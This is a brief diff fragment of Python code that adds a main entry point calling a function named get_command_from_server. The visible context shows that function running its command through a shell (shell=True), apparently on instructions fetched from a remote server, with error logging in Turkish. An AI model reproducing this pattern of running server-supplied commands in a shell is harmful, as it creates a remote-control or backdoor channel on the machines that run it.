@@ -36,3 +36,7 @@ def get_command_from_server():
                              stderr=subprocess.PIPE, shell=True).communicate()
     except Exception as e:
         log.writelog("get_command_from_server hata oluştu: " + str(e))
+
+
+if __name__ == "__main__":
+    get_command_from_server()
